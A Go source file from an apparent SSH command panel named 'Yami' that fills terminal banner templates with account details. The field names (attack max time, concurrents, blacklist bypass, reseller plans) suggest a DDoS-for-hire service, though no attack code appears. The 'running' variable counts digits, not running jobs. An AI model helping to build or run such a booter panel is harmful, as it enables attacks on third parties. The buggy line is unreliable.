package Branding

import (
	"Yami/core/clients/session"
	"Yami/core/db"
	"Yami/core/functions"
	"Yami/core/models/tfx"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func TermFXExecuteString(stringed string, conn *ssh.ServerConn) (string, error) {

	New := termfx.New()

	User, err := YamiDB.GetUser(conn.User()); if err != nil {
		log.Printf("Failed to fetch details for %s from database", err.Error())
		return "", fmt.Errorf("Failed to get user account details")
	}

	lol := time.Duration(time.Until(time.Unix(User.PlanExpiry, 0))).Hours()/24


	New.RegisterVariable("daysleft", strconv.FormatFloat(lol, 'f', 2, 64))

	running,_ := YamiDB.GetRunning()

	New.RegisterVariable("motd", functions.Motd)
	New.RegisterVariable("bypassblacklist", ColourizeBoolen(User.BypassBlacklist))
	New.RegisterVariable("powersavingmode", ColourizeBoolen(User.PowerSavingExempt))
	New.RegisterVariable("username", conn.User())
	New.RegisterVariable("online", strconv.Itoa(Sessions.Online()))
	New.RegisterVariable("maxtime", strconv.Itoa(User.MaxTime))
	New.RegisterVariable("cooldown", strconv.Itoa(User.Cooldown))
	New.RegisterVariable("concurrents", strconv.Itoa(User.Concurrents))
	New.RegisterVariable("running", strconv.Itoa(len(strconv.Itoa(running))))
	// MySent
	New.RegisterVariable("sent", strconv.Itoa(YamiDB.AmmountSent()))
	New.RegisterVariable("mysent", strconv.Itoa(YamiDB.MySent(conn.User())))

	if User.Admin {
		New.RegisterVariable("role", "Admin")
	} else if User.Reseller {
		New.RegisterVariable("role", "Reseller")
	} else if User.Vip {
		New.RegisterVariable("role", "User-VIP")
	} else {
		New.RegisterVariable("role", "Regular")
	}


	File, err := New.ExecuteString(stringed+"\r\n")
	File = strings.Replace(File, "\\x1b", "", -1)
	File = strings.Replace(File, "\\e", "", -1)

	return File, err
}